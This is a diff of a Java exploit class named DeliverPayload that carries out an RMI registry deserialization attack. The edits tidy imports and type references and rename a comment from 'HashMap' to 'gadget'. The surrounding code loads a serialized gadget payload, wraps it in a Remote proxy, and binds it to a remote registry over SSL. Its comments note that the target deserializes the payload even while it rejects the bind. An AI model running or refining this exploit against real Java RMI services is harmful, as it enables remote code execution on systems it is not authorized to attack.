@@ -1,8 +1,12 @@
-import java.rmi.*;
-import java.rmi.registry.*;
+import java.rmi.Remote;
+import java.rmi.registry.LocateRegistry;
+import java.rmi.registry.Registry;
+import java.rmi.server.RMISocketFactory;
 import java.io.*;
 import java.lang.reflect.*;
 import javax.net.ssl.*;
+import java.net.Socket;
+import java.net.ServerSocket;
 
 public class DeliverPayload {
 
@@ -34,7 +38,7 @@ public class DeliverPayload {
         }
         System.out.println("[+] Payload loaded: " + payload.getClass().getName());
 
-        // Wrap the HashMap in a Remote proxy because reg.bind() requires Remote
+        // Wrap the gadget in a Remote proxy because reg.bind() requires Remote
         Remote remoteProxy = (Remote) Proxy.newProxyInstance(
             DeliverPayload.class.getClassLoader(),
             new Class<?>[] { Remote.class },
@@ -43,10 +47,10 @@ public class DeliverPayload {
 
         // Create an SSL socket factory for the RMI connection
         RMISocketFactory sslFactory = new RMISocketFactory() {
-            public java.net.Socket createSocket(String h, int p) throws java.io.IOException {
+            public Socket createSocket(String h, int p) throws IOException {
                 return SSLSocketFactory.getDefault().createSocket(h, p);
             }
-            public java.net.ServerSocket createServerSocket(int p) throws java.io.IOException {
+            public ServerSocket createServerSocket(int p) throws IOException {
                 throw new UnsupportedOperationException();
             }
         };
@@ -68,7 +72,7 @@ public class DeliverPayload {
         try {
             reg.bind(name, remoteProxy);
             System.out.println("[+] Bind accepted.");
-        } catch (AccessException e) {
+        } catch (java.rmi.AccessException e) {
             // Expected: server rejects non-local bind, but ALREADY deserialized the payload
             System.out.println("[+] AccessException (expected) — payload was deserialized server-side.");
         } catch (Exception e) {
